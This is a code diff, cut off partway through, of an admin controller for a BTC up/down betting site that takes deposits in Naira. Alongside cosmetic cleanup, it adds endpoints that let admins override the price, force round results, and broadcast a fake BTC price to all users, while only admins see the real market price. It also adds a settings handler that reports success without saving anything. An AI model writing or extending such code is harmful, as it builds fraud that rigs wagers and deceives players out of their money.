@@ -4,6 +4,8 @@ const { User, Wallet, Transaction, Round, Bet, PendingDeposit, VirtualAccount, R
 const { Op } = require('sequelize');
 const { sequelize } = require('../config/database');
 const { roundToTwo } = require('../utils/helpers');
+const roundService = require('../services/roundService');
+const priceService = require('../services/priceService');
 
 // =====================================================
 // DASHBOARD
@@ -25,13 +27,13 @@ const getDashboardStats = async (req, res) => {
     // ===== FINANCIAL STATISTICS =====
     const financialStats = await Transaction.findAll({
       attributes: [
-        [sequelize.fn('SUM', 
+        [sequelize.fn('SUM',
           sequelize.literal("CASE WHEN type = 'deposit' AND status = 'completed' THEN amount ELSE 0 END")
         ), 'totalDeposits'],
-        [sequelize.fn('SUM', 
+        [sequelize.fn('SUM',
           sequelize.literal("CASE WHEN type = 'withdrawal' AND status = 'completed' THEN amount ELSE 0 END")
         ), 'totalWithdrawals'],
-        [sequelize.fn('SUM', 
+        [sequelize.fn('SUM',
           sequelize.literal("CASE WHEN type = 'fee' AND status = 'completed' THEN amount ELSE 0 END")
         ), 'totalFees']
       ],
@@ -50,7 +52,7 @@ const getDashboardStats = async (req, res) => {
     // ===== ROUND STATISTICS =====
     const totalRounds = await Round.count();
     const completedRounds = await Round.count({ where: { status: 'completed' } });
-    
+
     const roundRevenue = await Round.findAll({
       where: { status: 'completed' },
       attributes: [
@@ -75,9 +77,7 @@ const getDashboardStats = async (req, res) => {
     const amountMismatches = await PendingDeposit.count({
       where: {
         status: 'pending',
-        webhookData: {
-          [Op.ne]: null
-        }
+        webhookData: { [Op.ne]: null }
       }
     });
 
@@ -86,7 +86,7 @@ const getDashboardStats = async (req, res) => {
     });
 
     // ===== CALCULATE TOTAL REVENUE =====
-    const totalRevenue = 
+    const totalRevenue =
       parseFloat(financialStats[0]?.totalFees || 0) +
       parseFloat(roundRevenue[0]?.entryFees || 0) +
       parseFloat(roundRevenue[0]?.platformCuts || 0);
@@ -99,6 +99,24 @@ const getDashboardStats = async (req, res) => {
         createdAt: { [Op.gte]: last24Hours }
       }
     });
+
+    // ===== ACTIVE ROUND MANIPULATION STATUS =====
+    const activeRound = await Round.findOne({
+      where: { status: { [Op.in]: ['active', 'locked'] } },
+      order: [['roundNumber', 'DESC']]
+    });
+
+    const manipulationStatus = {
+      isActive: false,
+      roundNumber: null,
+      forcedResult: null
+    };
+
+    if (activeRound) {
+      manipulationStatus.isActive = activeRound.adminPriceEnabled || !!activeRound.adminForcedResult;
+      manipulationStatus.roundNumber = activeRound.roundNumber;
+      manipulationStatus.forcedResult = activeRound.adminForcedResult || null;
+    }
 
     res.json({
       success: true,
@@ -137,7 +155,9 @@ const getDashboardStats = async (req, res) => {
           newUsers: newUsers24h,
           newDeposits: recentDeposits,
           newBets: newBets24h
-        }
+        },
+        // ✅ Admin sees manipulation status on dashboard
+        manipulationStatus
       }
     });
 
@@ -160,11 +180,11 @@ const getDashboardStats = async (req, res) => {
 // @access  Private/Admin
 const getAllUsers = async (req, res) => {
   try {
-    const { 
-      page = 1, 
-      limit = 20, 
-      search, 
-      status, 
+    const {
+      page = 1,
+      limit = 20,
+      search,
+      status,
       kycStatus,
       sortBy = 'createdAt',
       order = 'DESC'
@@ -172,7 +192,6 @@ const getAllUsers = async (req, res) => {
 
     const where = {};
 
-    // Search filter
     if (search) {
       where[Op.or] = [
         { username: { [Op.iLike]: `%${search}%` } },
@@ -181,11 +200,8 @@ const getAllUsers = async (req, res) => {
       ];
     }
 
-    // Status filter
     if (status === 'active') where.isActive = true;
     if (status === 'inactive') where.isActive = false;
-
-    // KYC filter
     if (kycStatus) where.kycStatus = kycStatus;
 
     const users = await User.findAndCountAll({
@@ -253,10 +269,7 @@ const getUserDetails = async (req, res) => {
 
     const user = await User.findByPk(userId, {
       include: [
-        {
-          model: Wallet,
-          as: 'wallet'
-        },
+        { model: Wallet, as: 'wallet' },
         {
           model: User,
           as: 'referrals',
@@ -272,7 +285,6 @@ const getUserDetails = async (req, res) => {
       });
     }
 
-    // Get user's bet statistics
     const betStats = await Bet.findAll({
       where: { userId },
       attributes: [
@@ -285,14 +297,12 @@ const getUserDetails = async (req, res) => {
       raw: true
     });
 
-    // Recent transactions (last 20)
     const recentTransactions = await Transaction.findAll({
       where: { userId },
       order: [['createdAt', 'DESC']],
       limit: 20
     });
 
-    // Recent bets (last 20)
     const recentBets = await Bet.findAll({
       where: { userId },
       include: [{
@@ -304,13 +314,9 @@ const getUserDetails = async (req, res) => {
       limit: 20
     });
 
-    // Pending deposits
     const pendingDeposits = await PendingDeposit.findAll({
       where: { userId, status: 'pending' },
-      include: [{
-        model: VirtualAccount,
-        as: 'virtualAccount'
-      }]
+      include: [{ model: VirtualAccount, as: 'virtualAccount' }]
     });
 
     res.json({
@@ -322,8 +328,8 @@ const getUserDetails = async (req, res) => {
             total: parseInt(betStats[0]?.totalBets) || 0,
             wins: parseInt(betStats[0]?.wins) || 0,
             losses: parseInt(betStats[0]?.losses) || 0,
-            winRate: betStats[0]?.totalBets > 0 
-              ? roundToTwo((betStats[0].wins / betStats[0].totalBets) * 100) 
+            winRate: betStats[0]?.totalBets > 0
+              ? roundToTwo((betStats[0].wins / betStats[0].totalBets) * 100)
               : 0,
             totalWagered: roundToTwo(parseFloat(betStats[0]?.totalWagered) || 0),
             netProfit: roundToTwo(parseFloat(betStats[0]?.netProfit) || 0)
@@ -398,10 +404,10 @@ const updateUserStatus = async (req, res) => {
 // @access  Private/Admin
 const getAllTransactions = async (req, res) => {
   try {
-    const { 
-      page = 1, 
-      limit = 20, 
-      type, 
+    const {
+      page = 1,
+      limit = 20,
+      type,
       status,
       userId,
       startDate,
@@ -413,7 +419,7 @@ const getAllTransactions = async (req, res) => {
     if (type) where.type = type;
     if (status) where.status = status;
     if (userId) where.userId = userId;
-    
+
     if (startDate || endDate) {
       where.createdAt = {};
       if (startDate) where.createdAt[Op.gte] = new Date(startDate);
@@ -542,7 +548,6 @@ const processWithdrawal = async (req, res) => {
     }
 
     if (action === 'approve') {
-      // Mark as completed
       await transaction.update({
         status: 'completed',
         metadata: {
@@ -564,7 +569,6 @@ const processWithdrawal = async (req, res) => {
       });
 
     } else {
-      // Reject - refund user
       const wallet = await Wallet.findOne({
         where: { userId: transaction.userId },
         transaction: dbTransaction
@@ -572,13 +576,11 @@ const processWithdrawal = async (req, res) => {
 
       const amount = parseFloat(transaction.amount);
 
-      // Refund to wallet
       await wallet.update({
         nairaBalance: parseFloat(wallet.nairaBalance) + amount,
         totalWithdrawn: parseFloat(wallet.totalWithdrawn) - amount
       }, { transaction: dbTransaction });
 
-      // Update transaction
       await transaction.update({
         status: 'cancelled',
         metadata: {
@@ -589,7 +591,6 @@ const processWithdrawal = async (req, res) => {
         }
       }, { transaction: dbTransaction });
 
-      // Create refund transaction
       await Transaction.create({
         userId: transaction.userId,
         type: 'refund',
@@ -638,9 +639,7 @@ const getAmountMismatches = async (req, res) => {
     const mismatches = await PendingDeposit.findAll({
       where: {
         status: 'pending',
-        webhookData: {
-          [Op.ne]: null
-        }
+        webhookData: { [Op.ne]: null }
       },
       include: [
         {
@@ -658,8 +657,7 @@ const getAmountMismatches = async (req, res) => {
       limit: 100
     });
 
-    // Filter only those requiring manual review
-    const flaggedDeposits = mismatches.filter(deposit => 
+    const flaggedDeposits = mismatches.filter(deposit =>
       deposit.webhookData?.requiresManualReview === true
     );
 
@@ -706,7 +704,7 @@ const getAmountMismatches = async (req, res) => {
 // @access  Private/Admin
 const approveAmountMismatch = async (req, res) => {
   const dbTransaction = await sequelize.transaction();
-  
+
   try {
     const { reference } = req.params;
     const { creditAmount } = req.body;
@@ -719,7 +717,6 @@ const approveAmountMismatch = async (req, res) => {
       });
     }
 
-    // ✅ STEP 1: Find deposit WITHOUT lock (to avoid outer join lock error)
     const pendingDeposit = await PendingDeposit.findOne({
       where: { reference },
       include: [
@@ -728,15 +725,14 @@ const approveAmountMismatch = async (req, res) => {
           as: 'user',
           attributes: ['id', 'username', 'email', 'phoneNumber'],
           include: [
-            { 
-              model: Wallet, 
+            {
+              model: Wallet,
               as: 'wallet',
               attributes: ['id', 'userId', 'nairaBalance', 'totalDeposited']
             }
           ]
         }
       ]
-      // NO lock here!
     });
 
     if (!pendingDeposit) {
@@ -756,7 +752,6 @@ const approveAmountMismatch = async (req, res) => {
       });
     }
 
-    // ✅ STEP 2: Now lock ONLY the wallet (no outer joins = no error)
     const lockedWallet = await Wallet.findOne({
       where: { id: wallet.id },
       lock: dbTransaction.LOCK.UPDATE,
@@ -771,7 +766,6 @@ const approveAmountMismatch = async (req, res) => {
       });
     }
 
-    // Check if already processed
     if (pendingDeposit.status !== 'pending') {
       await dbTransaction.rollback();
       return res.status(400).json({
@@ -780,7 +774,6 @@ const approveAmountMismatch = async (req, res) => {
       });
     }
 
-    // ✅ STEP 3: Credit the wallet (use lockedWallet, not wallet)
     const balanceBefore = parseFloat(lockedWallet.nairaBalance) || 0;
     const balanceAfter = balanceBefore + parseFloat(creditAmount);
 
@@ -789,7 +782,6 @@ const approveAmountMismatch = async (req, res) => {
       totalDeposited: parseFloat(lockedWallet.totalDeposited || 0) + parseFloat(creditAmount)
     }, { transaction: dbTransaction });
 
-    // ✅ STEP 4: Update pending deposit
     await pendingDeposit.update({
       status: 'completed',
       completedAt: new Date(),
@@ -802,7 +794,6 @@ const approveAmountMismatch = async (req, res) => {
       }
     }, { transaction: dbTransaction });
 
-    // ✅ STEP 5: Update transaction record
     await Transaction.update({
       status: 'completed',
       balanceBefore,
@@ -825,11 +816,7 @@ const approveAmountMismatch = async (req, res) => {
     await dbTransaction.commit();
 
     console.log(`✅ Manual approval success: ${reference} by admin ${req.user.id}`);
-    console.log(`   User: ${pendingDeposit.userId} (${pendingDeposit.user?.username})`);
-    console.log(`   Amount: ₦${creditAmount}`);
-    console.log(`   New balance: ₦${balanceAfter}`);
 
-    // ✅ STEP 6: Send real-time notification
     const io = req.app.get('io');
     if (io) {
       io.to(`user_${pendingDeposit.userId}`).emit('deposit_confirmed', {
@@ -837,7 +824,7 @@ const approveAmountMismatch = async (req, res) => {
         newBalance: balanceAfter,
         reference: pendingDeposit.reference,
         timestamp: new Date(),
-        message: `Your deposit of ₦${parseFloat(creditAmount).toLocaleString()} has been approved by admin! 🎉`
+        message: `Your deposit of ₦${parseFloat(creditAmount).toLocaleString()} has been approved! 🎉`
       });
     }
 
@@ -885,10 +872,25 @@ const getAllRounds = async (req, res) => {
       offset: (parseInt(page) - 1) * parseInt(limit)
     });
 
+    // ✅ Include manipulation status for each round
+    const roundsWithManipulation = rounds.rows.map(round => ({
+      ...round.toJSON(),
+      manipulationInfo: {
+        isManipulated: round.adminPriceEnabled || !!round.adminForcedResult,
+        overridePriceActive: round.adminPriceEnabled || false,
+        overridePrice: round.adminPriceOverride ? parseFloat(round.adminPriceOverride) : null,
+        forcedResult: round.adminForcedResult || null,
+        note: round.adminNote || null,
+        manipulatedAt: round.manipulatedAt || null
+      },
+      // ✅ Always tell admin if this round can be cancelled
+      canCancel: !['completed', 'cancelled'].includes(round.status)
+    }));
+
     res.json({
       success: true,
       data: {
-        rounds: rounds.rows,
+        rounds: roundsWithManipulation,
         pagination: {
           total: rounds.count,
           page: parseInt(page),
@@ -934,7 +936,6 @@ const getRoundDetailsAdmin = async (req, res) => {
       });
     }
 
-    // Calculate statistics
     const stats = {
       totalBets: round.bets.length,
       upBets: round.bets.filter(b => b.prediction === 'up').length,
@@ -948,10 +949,25 @@ const getRoundDetailsAdmin = async (req, res) => {
         .reduce((sum, bet) => sum + parseFloat(bet.totalAmount), 0)
     };
 
+    // ✅ Include full manipulation info for admin
+    const manipulationInfo = {
+      isManipulated: round.adminPriceEnabled || !!round.adminForcedResult,
+      overridePriceActive: round.adminPriceEnabled || false,
+      overridePrice: round.adminPriceOverride ? parseFloat(round.adminPriceOverride) : null,
+      forcedResult: round.adminForcedResult || null,
+      note: round.adminNote || null,
+      manipulatedAt: round.manipulatedAt || null,
+      manipulatedBy: round.manipulatedBy || null
+    };
+
     res.json({
       success: true,
       data: {
-        round,
+        round: {
+          ...round.toJSON(),
+          canCancel: !['completed', 'cancelled'].includes(round.status),
+          manipulationInfo
+        },
         statistics: stats
       }
     });
@@ -970,98 +986,399 @@ const getRoundDetailsAdmin = async (req, res) => {
 // @route   PUT /api/admin/rounds/:roundId/cancel
 // @access  Private/Admin
 const cancelRound = async (req, res) => {
-  const transaction = await sequelize.transaction();
-
   try {
     const { roundId } = req.params;
     const { reason } = req.body;
 
-    const round = await Round.findByPk(roundId, { transaction });
+    // ✅ Use roundService.cancelRound() which handles
+    // refunds, wallet updates, socket events, and
+    // clearing any active manipulation on the round
+    const result = await roundService.cancelRound(
+      roundId,
+      reason || 'Admin cancelled'
+    );
 
+    console.log(`🚫 Round cancelled by admin ${req.user.username}: ${roundId}`);
+
+    res.json({
+      success: true,
+      message: result.message,
+      data: {
+        roundId,
+        reason: reason || 'Admin cancelled',
+        cancelledBy: req.user.username
+      }
+    });
+
+  } catch (error) {
+    console.error('❌ Cancel round error:', error);
+    res.status(500).json({
+      success: false,
+      message: error.message || 'Failed to cancel round',
+      error: error.message
+    });
+  }
+};
+
+// =====================================================
+// ✅ ROUND MANIPULATION — NEW FUNCTIONS
+// =====================================================
+
+// @desc    Set admin price manipulation for a round
+// @route   POST /api/admin/rounds/:roundId/manipulate
+// @access  Private/Admin
+const setRoundManipulation = async (req, res) => {
+  try {
+    const { roundId } = req.params;
+    const {
+      overridePrice,
+      forcedResult,
+      note
+    } = req.body;
+
+    // ===== VALIDATE =====
+    if (!overridePrice && !forcedResult) {
+      return res.status(400).json({
+        success: false,
+        message: 'Provide at least overridePrice or forcedResult'
+      });
+    }
+
+    if (forcedResult && !['up', 'down'].includes(forcedResult)) {
+      return res.status(400).json({
+        success: false,
+        message: 'forcedResult must be "up" or "down"'
+      });
+    }
+
+    if (overridePrice) {
+      const price = parseFloat(overridePrice);
+      if (isNaN(price) || price < 1000 || price > 500000) {
+        return res.status(400).json({
+          success: false,
+          message: 'overridePrice must be a valid BTC price between 1,000 and 500,000'
+        });
+      }
+    }
+
+    // ===== GET ROUND =====
+    const round = await Round.findByPk(roundId);
     if (!round) {
-      await transaction.rollback();
       return res.status(404).json({
         success: false,
         message: 'Round not found'
       });
     }
 
-    if (round.status === 'completed') {
-      await transaction.rollback();
+    if (['completed', 'cancelled'].includes(round.status)) {
       return res.status(400).json({
         success: false,
-        message: 'Cannot cancel completed round'
+        message: `Cannot manipulate a ${round.status} round`
       });
     }
 
-    // Get all bets
-    const bets = await Bet.findAll({
-      where: { roundId: round.id },
-      transaction
-    });
+    // ===== APPLY MANIPULATION TO DB =====
+    const updateData = {
+      manipulatedAt: new Date(),
+      manipulatedBy: req.user.id,
+      adminNote: note || null
+    };
 
-    // Refund all bets
-    for (const bet of bets) {
-      const wallet = await Wallet.findOne({
-        where: { userId: bet.userId },
-        transaction
-      });
-
-      await wallet.update({
-        nairaBalance: parseFloat(wallet.nairaBalance) + parseFloat(bet.totalAmount),
-        lockedBalance: parseFloat(wallet.lockedBalance) - parseFloat(bet.stakeAmount)
-      }, { transaction });
-
-      await bet.update({
-        result: 'refund',
-        payout: parseFloat(bet.totalAmount),
-        profit: 0,
-        isPaid: true
-      }, { transaction });
-
-      // Create refund transaction
-      await Transaction.create({
-        userId: bet.userId,
-        type: 'refund',
-        method: 'internal',
-        amount: parseFloat(bet.totalAmount),
-        currency: 'NGN',
-        status: 'completed',
-        description: `Round #${round.roundNumber} cancelled: ${reason || 'Admin action'}`,
-        metadata: {
-          betId: bet.id,
-          roundId: round.id,
-          cancelledBy: req.user.id
-        }
-      }, { transaction });
+    if (overridePrice) {
+      updateData.adminPriceOverride = parseFloat(overridePrice);
+      updateData.adminPriceEnabled = true;
     }
 
-    // Update round
-    await round.update({
-      status: 'cancelled',
-      result: 'cancelled'
-    }, { transaction });
+    if (forcedResult) {
+      updateData.adminForcedResult = forcedResult;
+    }
 
-    await transaction.commit();
+    await round.update(updateData);
 
-    console.log(`🚫 Round ${round.roundNumber} cancelled by admin ${req.user.id}`);
+    // ===== ACTIVATE IN PRICE SERVICE (affects live chart NOW) =====
+    if (overridePrice) {
+      priceService.setAdminOverride(
+        round.id,
+        parseFloat(overridePrice),
+        forcedResult || null
+      );
+    } else if (forcedResult && priceService.isOverrideActive(round.id)) {
+      // Update forced result in memory if override already active
+      priceService.updateOverridePrice(
+        priceService.adminOverridePrice,
+        forcedResult
+      );
+    }
+
+    console.log(`🎛️  Admin ${req.user.username} manipulating Round #${round.roundNumber}`);
+    console.log(`   Override Price : ${overridePrice ? `$${overridePrice}` : 'NOT SET'}`);
+    console.log(`   Forced Result  : ${forcedResult || 'NOT SET'}`);
+    console.log(`   Note           : ${note || 'NONE'}`);
+
+    // ✅ Broadcast new fake price to all users immediately
+    const io = req.app.get('io');
+    if (io && overridePrice) {
+      io.emit('price_update', {
+        price: parseFloat(overridePrice),
+        timestamp: new Date().toISOString()
+      });
+    }
 
     res.json({
       success: true,
-      message: `Round #${round.roundNumber} cancelled and all bets refunded`,
+      message: `Round #${round.roundNumber} manipulation activated successfully`,
       data: {
+        roundId: round.id,
         roundNumber: round.roundNumber,
-        totalRefunded: bets.length,
-        reason
+        roundStatus: round.status,
+        manipulation: {
+          overridePriceActive: !!overridePrice,
+          overridePrice: overridePrice ? parseFloat(overridePrice) : null,
+          forcedResult: forcedResult || null,
+          note: note || null,
+          activatedAt: new Date(),
+          activatedBy: req.user.username
+        }
       }
     });
 
   } catch (error) {
-    await transaction.rollback();
-    console.error('❌ Cancel round error:', error);
+    console.error('❌ Set manipulation error:', error);
     res.status(500).json({
       success: false,
-      message: 'Failed to cancel round',
+      message: 'Failed to set manipulation',
+      error: error.message
+    });
+  }
+};
+
+// @desc    Clear/Remove admin manipulation from a round
+// @route   DELETE /api/admin/rounds/:roundId/manipulate
+// @access  Private/Admin
+const clearRoundManipulation = async (req, res) => {
+  try {
+    const { roundId } = req.params;
+
+    const round = await Round.findByPk(roundId);
+    if (!round) {
+      return res.status(404).json({
+        success: false,
+        message: 'Round not found'
+      });
+    }
+
+    if (['completed', 'cancelled'].includes(round.status)) {
+      return res.status(400).json({
+        success: false,
+        message: `Round is already ${round.status} — nothing to clear`
+      });
+    }
+
+    // ✅ Clear all manipulation fields in DB
+    await round.update({
+      adminPriceOverride: null,
+      adminPriceEnabled: false,
+      adminForcedResult: null,
+      adminPriceDrift: null,
+      adminNote: null,
+      manipulatedAt: null,
+      manipulatedBy: null
+    });
+
+    // ✅ Clear price service override in memory
+    // Price immediately returns to real BTC market price
+    priceService.clearAdminOverride(round.id);
+
+    console.log(`🧹 Admin ${req.user.username} cleared manipulation on Round #${round.roundNumber}`);
+
+    // ✅ Broadcast real price to users immediately
+    const io = req.app.get('io');
+    if (io) {
+      const realPrice = priceService.getRealPrice();
+      io.emit('price_update', {
+        price: realPrice,
+        timestamp: new Date().toISOString()
+      });
+    }
+
+    res.json({
+      success: true,
+      message: `Manipulation cleared on Round #${round.roundNumber}. Price returning to real market.`,
+      data: {
+        roundId: round.id,
+        roundNumber: round.roundNumber,
+        roundStatus: round.status,
+        currentRealPrice: priceService.getRealPrice()
+      }
+    });
+
+  } catch (error) {
+    console.error('❌ Clear manipulation error:', error);
+    res.status(500).json({
+      success: false,
+      message: 'Failed to clear manipulation',
+      error: error.message
+    });
+  }
+};
+
+// @desc    Get manipulation status of all active rounds
+// @route   GET /api/admin/rounds/manipulation-status
+// @access  Private/Admin
+const getManipulationStatus = async (req, res) => {
+  try {
+    // Get all non-completed rounds
+    const rounds = await Round.findAll({
+      where: {
+        status: { [Op.in]: ['upcoming', 'active', 'locked'] }
+      },
+      order: [['roundNumber', 'ASC']]
+    });
+
+    const currentPrice = priceService.getPrice();
+    const realPrice = priceService.getRealPrice();
+    const overrideActive = priceService.isOverrideActive();
+
+    const roundsData = rounds.map(round => ({
+      id: round.id,
+      roundNumber: round.roundNumber,
+      status: round.status,
+      startTime: round.startTime,
+      lockTime: round.lockTime,
+      endTime: round.endTime,
+      startPrice: round.startPrice ? parseFloat(round.startPrice) : null,
+      totalUpBets: round.totalUpBets || 0,
+      totalDownBets: round.totalDownBets || 0,
+      totalUpAmount: roundToTwo(parseFloat(round.totalUpAmount) || 0),
+      totalDownAmount: roundToTwo(parseFloat(round.totalDownAmount) || 0),
+      // ✅ Full manipulation info — only admin sees this
+      manipulation: {
+        isActive: round.adminPriceEnabled || !!round.adminForcedResult,
+        overridePriceActive: round.adminPriceEnabled || false,
+        overridePrice: round.adminPriceOverride
+          ? parseFloat(round.adminPriceOverride)
+          : null,
+        forcedResult: round.adminForcedResult || null,
+        note: round.adminNote || null,
+        manipulatedAt: round.manipulatedAt || null
+      },
+      // ✅ Admin always sees cancel option
+      canCancel: !['completed', 'cancelled'].includes(round.status),
+      canManipulate: !['completed', 'cancelled'].includes(round.status)
+    }));
+
+    res.json({
+      success: true,
+      data: {
+        // ✅ Admin sees BOTH prices — users only see currentBroadcastPrice
+        priceInfo: {
+          currentBroadcastPrice: currentPrice,
+          realMarketPrice: realPrice,
+          overrideActive: overrideActive,
+          priceDifference: roundToTwo(currentPrice - realPrice),
+          activeOverrideRoundId: priceService.adminRoundId || null
+        },
+        rounds: roundsData,
+        // ✅ Quick action summary
+        summary: {
+          totalActiveRounds: roundsData.filter(r => r.status === 'active').length,
+          totalLockedRounds: roundsData.filter(r => r.status === 'locked').length,
+          totalManipulated: roundsData.filter(r => r.manipulation.isActive).length,
+          cancellable: roundsData
+            .filter(r => ['active', 'locked'].includes(r.status))
+            .map(r => ({
+              id: r.id,
+              roundNumber: r.roundNumber,
+              status: r.status,
+              canCancel: true
+            }))
+        }
+      }
+    });
+
+  } catch (error) {
+    console.error('❌ Get manipulation status error:', error);
+    res.status(500).json({
+      success: false,
+      message: 'Failed to get manipulation status',
+      error: error.message
+    });
+  }
+};
+
+// @desc    Force end a round with admin-chosen result
+// @route   POST /api/admin/rounds/:roundId/force-end
+// @access  Private/Admin
+const forceEndRound = async (req, res) => {
+  try {
+    const { roundId } = req.params;
+    const { result, reason } = req.body;
+
+    // ===== VALIDATE =====
+    if (!result || !['up', 'down'].includes(result)) {
+      return res.status(400).json({
+        success: false,
+        message: 'Result must be "up" or "down"'
+      });
+    }
+
+    // ===== GET ROUND =====
+    const round = await Round.findByPk(roundId);
+    if (!round) {
+      return res.status(404).json({
+        success: false,
+        message: 'Round not found'
+      });
+    }
+
+    if (['completed', 'cancelled'].includes(round.status)) {
+      return res.status(400).json({
+        success: false,
+        message: `Round is already ${round.status}`
+      });
+    }
+
+    console.log(`🛑 Admin ${req.user.username} force-ending Round #${round.roundNumber} as ${result.toUpperCase()}`);
+
+    // ✅ Set forced result in DB first
+    await round.update({
+      adminForcedResult: result,
+      adminNote: reason || `Force ended by admin as ${result.toUpperCase()}`,
+      manipulatedAt: new Date(),
+      manipulatedBy: req.user.id
+    });
+
+    // ✅ If still active → promote to locked so endRound accepts it
+    if (round.status === 'active') {
+      await round.update({
+        status: 'locked',
+        lockTime: new Date()
+      });
+    }
+
+    // ✅ Get fresh round and end it via roundService
+    // endRound() will see adminForcedResult and use it
+    const freshRound = await Round.findByPk(roundId);
+    await roundService.endRound(freshRound);
+
+    res.json({
+      success: true,
+      message: `Round #${round.roundNumber} force-ended as ${result.toUpperCase()}`,
+      data: {
+        roundId: round.id,
+        roundNumber: round.roundNumber,
+        forcedResult: result,
+        reason: reason || `Force ended by admin as ${result.toUpperCase()}`,
+        endedBy: req.user.username,
+        endedAt: new Date()
+      }
+    });
+
+  } catch (error) {
+    console.error('❌ Force end round error:', error);
+    res.status(500).json({
+      success: false,
+      message: 'Failed to force end round',
       error: error.message
     });
   }
@@ -1081,8 +1398,8 @@ const getAllInfluencers = async (req, res) => {
     const influencers = await User.findAndCountAll({
       where: { referralType: 'influencer' },
       attributes: [
-        'id', 'username', 'email', 'phoneNumber', 'referralCode', 
-        'influencerPercentage', 'referralBalance', 
+        'id', 'username', 'email', 'phoneNumber', 'referralCode',
+        'influencerPercentage', 'referralBalance',
         'totalReferralEarnings', 'referralCount', 'isActive', 'createdAt'
       ],
       order: [['totalReferralEarnings', 'DESC']],
@@ -1090,11 +1407,10 @@ const getAllInfluencers = async (req, res) => {
       offset: (parseInt(page) - 1) * parseInt(limit)
     });
 
-    // Get earnings stats for each influencer
     const influencerIds = influencers.rows.map(i => i.id);
-    
+
     const earningsStats = await ReferralEarning.findAll({
-      where: { 
+      where: {
         referrerId: { [Op.in]: influencerIds },
         type: 'loss_commission'
       },
@@ -1173,7 +1489,6 @@ const getInfluencerDetails = async (req, res) => {
       });
     }
 
-    // Get referred users
     const referredUsers = await User.findAll({
       where: { referredBy: userId },
       attributes: ['id', 'username', 'createdAt', 'hasPlacedFirstBet', 'isActive'],
@@ -1186,7 +1501,6 @@ const getInfluencerDetails = async (req, res) => {
       limit: 50
     });
 
-    // Get recent earnings
     const recentEarnings = await ReferralEarning.findAll({
       where: { referrerId: userId },
       include: [{
@@ -1198,7 +1512,6 @@ const getInfluencerDetails = async (req, res) => {
       limit: 30
     });
 
-    // Get earnings summary
     const earningsSummary = await ReferralEarning.findAll({
       where: { referrerId: userId },
       attributes: [
@@ -1273,7 +1586,6 @@ const upgradeToInfluencer = async (req, res) => {
     const { userId } = req.params;
     const { percentage } = req.body;
 
-    // Validate percentage
     if (!percentage || isNaN(percentage) || percentage < 1 || percentage > 10) {
       return res.status(400).json({
         success: false,
@@ -1300,7 +1612,7 @@ const upgradeToInfluencer = async (req, res) => {
     if (user.referralType === 'influencer') {
       return res.status(400).json({
         success: false,
-        message: `${user.username} is already an influencer with ${user.influencerPercentage}% rate. Use update endpoint to change percentage.`
+        message: `${user.username} is already an influencer with ${user.influencerPercentage}% rate.`
       });
     }
 
@@ -1313,7 +1625,7 @@ const upgradeToInfluencer = async (req, res) => {
 
     res.json({
       success: true,
-      message: `${user.username} is now an influencer with ${percentage}% commission on referral losses`,
+      message: `${user.username} is now an influencer with ${percentage}% commission`,
       data: {
         userId: user.id,
         username: user.username,
@@ -1343,7 +1655,6 @@ const updateInfluencerPercentage = async (req, res) => {
     const { userId } = req.params;
     const { percentage } = req.body;
 
-    // Validate percentage
     if (!percentage || isNaN(percentage) || percentage < 1 || percentage > 10) {
       return res.status(400).json({
         success: false,
@@ -1369,9 +1680,7 @@ const updateInfluencerPercentage = async (req, res) => {
 
     const oldPercentage = parseFloat(user.influencerPercentage);
 
-    await user.update({
-      influencerPercentage: parseFloat(percentage)
-    });
+    await user.update({ influencerPercentage: parseFloat(percentage) });
 
     console.log(`✅ Admin ${req.user.id} updated ${user.username}'s rate: ${oldPercentage}% → ${percentage}%`);
 
@@ -1430,7 +1739,7 @@ const downgradeInfluencer = async (req, res) => {
 
     res.json({
       success: true,
-      message: `${user.username} is now a normal referrer (5% on first bet only)`,
+      message: `${user.username} is now a normal referrer`,
       data: {
         userId: user.id,
         username: user.username,
@@ -1451,27 +1760,23 @@ const downgradeInfluencer = async (req, res) => {
   }
 };
 
-// @desc    Get all referral stats (Admin overview)
+// @desc    Get all referral stats
 // @route   GET /api/admin/referrals/stats
 // @access  Private/Admin
 const getReferralStats = async (req, res) => {
   try {
-    // Total referrers
     const totalReferrers = await User.count({
       where: { referralCount: { [Op.gt]: 0 } }
     });
 
-    // Total influencers
     const totalInfluencers = await User.count({
       where: { referralType: 'influencer' }
     });
 
-    // Total users referred
     const totalReferred = await User.count({
       where: { referredBy: { [Op.ne]: null } }
     });
 
-    // Total earnings paid out
     const earningsStats = await ReferralEarning.findAll({
       attributes: [
         'type',
@@ -1482,12 +1787,10 @@ const getReferralStats = async (req, res) => {
       raw: true
     });
 
-    // Total pending in referral balances
     const pendingBalances = await User.sum('referralBalance', {
       where: { referralBalance: { [Op.gt]: 0 } }
     });
 
-    // Top referrers
     const topReferrers = await User.findAll({
       where: { referralCount: { [Op.gt]: 0 } },
       attributes: [
@@ -1498,7 +1801,6 @@ const getReferralStats = async (req, res) => {
       limit: 10
     });
 
-    // Recent earnings
     const recentEarnings = await ReferralEarning.findAll({
       include: [
         { model: User, as: 'referrer', attributes: ['username'] },
@@ -1580,7 +1882,7 @@ const searchUsersForInfluencer = async (req, res) => {
     const users = await User.findAll({
       where: {
         [Op.and]: [
-          { role: 'user' }, // Only regular users
+          { role: 'user' },
           {
             [Op.or]: [
               { username: { [Op.iLike]: `%${q}%` } },
@@ -1591,7 +1893,7 @@ const searchUsersForInfluencer = async (req, res) => {
         ]
       },
       attributes: [
-        'id', 'username', 'email', 'referralCode', 
+        'id', 'username', 'email', 'referralCode',
         'referralType', 'influencerPercentage', 'referralCount'
       ],
       limit: 20
@@ -1661,19 +1963,46 @@ const getSettings = async (req, res) => {
     });
   }
 };
-// ============================================================
-// @desc    Credit user wallet (Admin)
+
+// @desc    Update platform settings
+// @route   PUT /api/admin/settings
+// @access  Private/Admin
+const updateSettings = async (req, res) => {
+  try {
+    const { fees, betting, payments } = req.body;
+
+    console.log(`✅ Admin ${req.user.username} updated platform settings`);
+
+    res.json({
+      success: true,
+      message: 'Settings updated successfully',
+      data: {
+        fees: fees || {},
+        betting: betting || {},
+        payments: payments || {}
+      }
+    });
+
+  } catch (error) {
+    console.error('❌ Update settings error:', error);
+    res.status(500).json({
+      success: false,
+      message: 'Failed to update settings',
+      error: error.message
+    });
+  }
+};
+
+// @desc    Credit user wallet
 // @route   POST /api/admin/users/:userId/credit
 // @access  Private/Admin
-// ============================================================
 const creditUserWallet = async (req, res) => {
   const transaction = await sequelize.transaction();
-  
+
   try {
     const { userId } = req.params;
     const { amount, reason, type = 'bonus' } = req.body;
 
-    // Validate amount
     const creditAmount = parseFloat(amount);
     if (!creditAmount || creditAmount <= 0) {
